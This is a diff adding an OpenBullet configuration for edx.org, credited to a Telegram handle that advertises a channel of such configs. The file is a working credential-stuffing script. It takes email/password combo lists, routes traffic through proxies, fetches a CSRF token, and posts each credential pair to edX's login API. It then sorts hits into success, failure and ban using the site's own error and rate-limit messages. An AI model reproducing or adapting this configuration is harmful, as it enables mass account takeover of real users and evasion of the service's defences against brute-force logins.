@@ -1,0 +1,105 @@
+[SETTINGS]
+{
+  "Name": "edx.org",
+  "SuggestedBots": 60,
+  "MaxCPM": 0,
+  "LastModified": "2021-08-29T15:46:07.7445258+04:30",
+  "AdditionalInfo": "https://t.me/Hogo_Victor",
+  "Author": "@Hogo_Victor",
+  "Version": "1.4.4 [Anomaly]",
+  "IgnoreResponseErrors": false,
+  "MaxRedirects": 8,
+  "NeedsProxies": true,
+  "OnlySocks": false,
+  "OnlySsl": false,
+  "MaxProxyUses": 0,
+  "BanProxyAfterGoodStatus": false,
+  "EncodeData": false,
+  "AllowedWordlist1": "MailPass",
+  "AllowedWordlist2": "UserPass",
+  "DataRules": [],
+  "CustomInputs": [
+    {
+      "Description": "Author Telegram Id:@Hogo_Victor | Telegram Channel: @Open_Bullet_Config",
+      "VariableName": "",
+      "Id": 832271153
+    }
+  ],
+  "CaptchaUrl": "",
+  "Base64": "",
+  "Grayscale": false,
+  "RemoveLines": false,
+  "RemoveNoise": false,
+  "Dilate": false,
+  "Threshold": 1.0,
+  "DiffKeep": 0.0,
+  "DiffHide": 0.0,
+  "Saturate": false,
+  "Saturation": 0.0,
+  "Transparent": false,
+  "Contour": false,
+  "OnlyShow": false,
+  "ContrastGamma": false,
+  "Contrast": 1.0,
+  "Gamma": 1.0,
+  "Brightness": 1.0,
+  "RemoveLinesMin": 0,
+  "RemoveLinesMax": 0,
+  "Crop": false,
+  "ForceHeadless": false,
+  "AlwaysOpen": false,
+  "AlwaysQuit": false,
+  "DisableNotifications": false,
+  "CustomUserAgent": "",
+  "RandomUA": false,
+  "CustomCMDArgs": ""
+}
+
+[SCRIPT]
+#Get REQUEST GET "https://courses.edx.org/csrf/api/v1/token" 
+  
+  HEADER "Host: courses.edx.org" 
+  HEADER "Connection: close" 
+  HEADER "sec-ch-ua: \" Not A;Brand\";v=\"99\", \"Chromium\";v=\"92\"" 
+  HEADER "Accept: application/json, text/plain, */*" 
+  HEADER "sec-ch-ua-mobile: ?0" 
+  HEADER "User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/92.0.4515.159 Safari/537.36" 
+  HEADER "USE-JWT-COOKIE: true" 
+  HEADER "Origin: https://authn.edx.org" 
+  HEADER "Sec-Fetch-Site: same-site" 
+  HEADER "Sec-Fetch-Mode: cors" 
+  HEADER "Sec-Fetch-Dest: empty" 
+  HEADER "Referer: https://authn.edx.org/" 
+  HEADER "Accept-Language: en-US,en;q=0.9" 
+  HEADER "Accept-Encoding: gzip, deflate" 
+
+#csrfToken PARSE "<SOURCE>" LR "csrfToken\":\"" "\"" -> VAR "csrfToken" 
+
+#Login REQUEST POST "https://courses.edx.org/api/user/v2/account/login_session/" EncodeContent=TRUE 
+  CONTENT "email_or_username=<USER>&password=<PASS>" 
+  CONTENTTYPE "application/x-www-form-urlencoded" 
+  HEADER "Host: courses.edx.org" 
+  HEADER "Connection: close" 
+  HEADER "sec-ch-ua: \" Not A;Brand\";v=\"99\", \"Chromium\";v=\"92\"" 
+  HEADER "Accept: application/json, text/plain, */*" 
+  HEADER "X-CSRFToken: <csrfToken>" 
+  HEADER "sec-ch-ua-mobile: ?0" 
+  HEADER "User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/92.0.4515.159 Safari/537.36" 
+  HEADER "Origin: https://authn.edx.org" 
+  HEADER "Sec-Fetch-Site: same-site" 
+  HEADER "Sec-Fetch-Mode: cors" 
+  HEADER "Sec-Fetch-Dest: empty" 
+  HEADER "Referer: https://authn.edx.org/" 
+  HEADER "Accept-Language: en-US,en;q=0.9" 
+  HEADER "Accept-Encoding: gzip, deflate" 
+
+KEYCHECK 
+  KEYCHAIN Failure OR 
+    KEY "Email or password is incorrect." 
+  KEYCHAIN Success OR 
+    KEY "success\": true" 
+  KEYCHAIN Ban OR 
+    KEY "Too many failed login attempts. Try again later." 
+
+#Config_By FUNCTION Constant "@Hogo_Victor" -> CAP "Config By" 
+
